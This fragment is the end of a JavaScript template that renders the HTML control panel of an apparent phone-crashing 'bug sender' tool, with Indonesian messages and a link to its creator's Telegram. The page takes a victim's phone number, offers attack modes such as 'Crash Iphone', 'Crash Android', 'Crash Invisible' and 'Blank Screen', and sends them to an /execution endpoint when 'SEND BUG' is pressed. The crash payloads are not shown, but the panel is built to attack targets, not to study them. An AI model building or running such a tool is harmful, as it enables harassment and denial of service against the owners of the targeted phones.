      border: 1px solid #330000;
      color: #ff0000;
      margin-bottom: 18px;
      outline: none;
    }
    select option {
      background: #1a0000;
      color: #ff0000;
    }
    .execute-button {
      background: #990000;
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 14px;
      cursor: pointer;
    }
    .execute-button:hover {
      background: #ff0000;
      box-shadow: 0 0 15px rgba(255,0,0,0.9);
      transform: scale(1.03);
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid #ff0000;
      border-radius: 8px;
      padding: 8px 14px;
      font-size: 14px;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .footer-button a {
      text-decoration: none;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.cloudkuimages.guru/images/0zRVNmL5.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Please input target number." id="targetNumber" />

    <!-- Satu kotak list bug -->
    <select id="bugList">
      <option value="">List Bug Message</option>
      <option value="BugForce">Force Close Ui</option>
      <option value="BugCrashIos">Crash Iphone</option>
      <option value="BugCrashAndro">Crash Android</option>
      <option value="BugInvisible">Crash Invisible</option>
      <option value="BugBlank">Blank Screen</option>
    </select>

    <button class="execute-button" id="executeBtn"><i class="fas fa-rocket"></i> SEND BUG</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/dilxzcode" target="_blank">
          <i class="fab fa-telegram"></i> Creator Apps
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>
  <script>
    const inputField = document.getElementById('targetNumber');
    const bugList = document.getElementById('bugList');
    const executeBtn = document.getElementById('executeBtn');

    function isValidNumber(number) {
      const pattern = /^\+?[1-9]\d{7,14}$/;
      return pattern.test(number);
    }

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      const selectedMode = bugList.value;

      if (!selectedMode) {
        alert("⚠️ Pilih jenis bug dulu!");
        return;
      }
      if (!number) {
        alert("⚠️ Masukkan nomor dulu!");
        return;
      }
      if (!isValidNumber(number)) {
        alert("❌ Nomor tidak valid!");
        return;
      }

      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};